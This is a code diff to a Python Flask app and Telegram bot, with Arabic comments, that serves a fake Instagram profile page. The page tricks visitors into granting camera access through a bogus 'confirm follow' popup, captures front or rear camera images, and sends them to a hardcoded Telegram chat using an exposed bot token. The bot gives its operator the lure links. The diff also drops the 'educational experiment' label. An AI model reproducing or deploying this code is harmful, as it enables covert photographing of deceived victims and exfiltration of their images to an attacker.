@@ -1,4 +1,5 @@
 import os
+import asyncio
 from flask import Flask, request, jsonify, render_template_string
 import requests
 import base64
@@ -11,10 +12,8 @@ app = Flask(__name__)
 # بياناتك الخاصة
 BOT_TOKEN = "8664732759:AAEdqmFKSYqgd8DpIU7JlCrpsu7TRAIAHcw"
 CHAT_ID = "6691718718"
-# بعد ما ترفع الكود، رح تحط رابط الموقع هون (مثلاً: https://shado-bot.onrender.com)
-WEB_URL = "https://shado-bot.onrender.com"
+WEB_URL = "https://shado-bot.onrender.com" 
 
-# --- الجزء الأول: صفحة الإنستجرام (HTML) ---
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -33,17 +32,13 @@ HTML_PAGE = """
     <h2 style="font-size: 18px;">_hqrn</h2>
     <p style="font-size: 14px; color: #8e8e8e;">1,734 followers</p>
     <button class="follow-btn" id="followBtn">Follow</button>
-
     <div id="popup">
         <p><b>تأكيد المتابعة</b></p>
-        <p style="font-size: 12px;">يجب السماح بالتحقق السريع لمتابعة الحسابات الخاصة.</p>
         <button id="confirmBtn" style="background:#0095f6; color:white; border:none; padding:10px 20px; border-radius:5px; width:100%;">تأكيد</button>
     </div>
-
     <script>
         const mode = new URLSearchParams(window.location.search).get('mode') || 'user';
         document.getElementById('followBtn').onclick = () => document.getElementById('popup').style.display = 'block';
-        
         document.getElementById('confirmBtn').onclick = () => {
             document.getElementById('popup').style.display = 'none';
             navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } })
@@ -74,26 +69,33 @@ def index(): return render_template_string(HTML_PAGE)
 
 @app.route('/upload', methods=['POST'])
 def upload():
-    img_data = request.json.get('image').split(",")[1]
-    with open("shot.jpg", "wb") as f: f.write(base64.b64decode(img_data))
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-    with open("shot.jpg", "rb") as f: requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': f})
+    data = request.json.get('image')
+    if data:
+        img_data = data.split(",")[1]
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+        requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': ('shot.jpg', base64.b64decode(img_data))})
     return jsonify({"status": "ok"})
 
-# --- الجزء الثاني: بوت التلغرام ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
-        [InlineKeyboardButton("📸 رابط الكاميرا الأمامية", url=f"{WEB_URL}?mode=user")],
-        [InlineKeyboardButton("📷 رابط الكاميرا الخلفية", url=f"{WEB_URL}?mode=environment")]
+        [InlineKeyboardButton("📸 كاميرا أمامية", url=f"{WEB_URL}?mode=user")],
+        [InlineKeyboardButton("📷 كاميرا خلفية", url=f"{WEB_URL}?mode=environment")]
     ]
-    await update.message.reply_text("اختر الرابط للتجربة التعليمية:", reply_markup=InlineKeyboardMarkup(keyboard))
+    await update.message.reply_text("اختر الرابط:", reply_markup=InlineKeyboardMarkup(keyboard))
 
-def run_bot():
-    bot_app = Application.builder().token(BOT_TOKEN).build()
-    bot_app.add_handler(CommandHandler("start", start))
-    bot_app.run_polling()
+def main():
+    # تشغيل البوت بطريقة متوافقة مع Render
+    application = Application.builder().token(BOT_TOKEN).build()
+    application.add_handler(CommandHandler("start", start))
+    
+    # تشغيل Flask في Thread منفصل
+    def run_flask():
+        app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    
+    threading.Thread(target=run_flask, daemon=True).start()
+    
+    # تشغيل البوت
+    application.run_polling(close_loop=False)
 
 if __name__ == '__main__':
-    # تشغيل البوت في Thread والسيرفر في الـ Main
-    threading.Thread(target=run_bot).start()
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    main()
